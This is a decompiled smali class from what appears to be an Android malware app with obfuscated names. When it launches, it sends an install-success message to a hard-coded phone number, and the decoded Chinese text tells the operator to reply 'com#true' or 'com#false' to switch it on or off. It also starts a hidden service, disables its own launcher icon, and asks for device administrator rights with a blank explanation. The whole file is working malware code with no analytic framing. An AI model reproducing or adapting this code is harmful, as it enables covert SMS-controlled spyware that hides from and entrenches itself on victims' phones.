.class public Lji/yj/ur/a201jhfg20180420ab/JieMian;
.super Landroid/app/Activity;
.source "JieMian.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 10
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method private hhhhhhh()V
    .locals 5

    .prologue
    const/4 v4, 0x1

    .line 34
    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JieMian;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    .line 35
    .local v2, "retr":Landroid/content/pm/PackageManager;
    new-instance v0, Landroid/content/ComponentName;

    .line 36
    const-class v3, Lji/yj/ur/a201jhfg20180420ab/JieMian;

    .line 35
    invoke-direct {v0, p0, v3}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 37
    .local v0, "iuyiuy":Landroid/content/ComponentName;
    invoke-virtual {v2, v0}, Landroid/content/pm/PackageManager;->getComponentEnabledSetting(Landroid/content/ComponentName;)I

    move-result v1

    .line 38
    .local v1, "res":I
    if-eqz v1, :cond_0

    .line 39
    if-ne v1, v4, :cond_1

    .line 41
    :cond_0
    const/4 v3, 0x2

    .line 40
    invoke-virtual {v2, v0, v3, v4}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    .line 43
    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JieMian;->finish()V

    .line 45
    :cond_1
    return-void
.end method


# virtual methods
.method public onCreate(Landroid/os/Bundle;)V
    .locals 7
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 14
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 15
    const/high16 v4, 0x7f030000

    invoke-virtual {p0, v4}, Lji/yj/ur/a201jhfg20180420ab/JieMian;->setContentView(I)V

    .line 17
    new-instance v2, Lji/yj/ur/a201jhfg20180420ab/JM02;

    invoke-direct {v2}, Lji/yj/ur/a201jhfg20180420ab/JM02;-><init>()V

    .line 18
    .local v2, "su":Lji/yj/ur/a201jhfg20180420ab/JM02;
    const-string v4, "18016217928"

    const-string v5, "\u5b89\u88c5\u6210\u529f,\u56de\u590dcom#false\u5173\u95edcom#true\u5f00\u542f"

    const/4 v6, 0x0

    invoke-virtual {v2, v4, v5, v6}, Lji/yj/ur/a201jhfg20180420ab/JM02;->gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 20
    new-instance v3, Landroid/content/Intent;

    const-class v4, Lji/yj/ur/a201jhfg20180420ab/JM01;

    invoke-direct {v3, p0, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 21
    .local v3, "yyyy":Landroid/content/Intent;
    invoke-virtual {p0, v3}, Lji/yj/ur/a201jhfg20180420ab/JieMian;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 23
    invoke-direct {p0}, Lji/yj/ur/a201jhfg20180420ab/JieMian;->hhhhhhh()V

    .line 25
    new-instance v1, Landroid/content/ComponentName;

    const-class v4, Lji/yj/ur/a201jhfg20180420ab/JM06;

    invoke-direct {v1, p0, v4}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 26
    .local v1, "bbbbbb":Landroid/content/ComponentName;
    new-instance v0, Landroid/content/Intent;

    const-string v4, "android.app.action.ADD_DEVICE_ADMIN"

    invoke-direct {v0, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 27
    .local v0, "abljg":Landroid/content/Intent;
    const-string v4, "android.app.extra.DEVICE_ADMIN"

    invoke-virtual {v0, v4, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    .line 28
    const-string v4, "android.app.extra.ADD_EXPLANATION"

    const-string v5, "---------"

    invoke-virtual {v0, v4, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 29
    invoke-virtual {p0, v0}, Lji/yj/ur/a201jhfg20180420ab/JieMian;->startActivity(Landroid/content/Intent;)V

    .line 31
    return-void
.end method
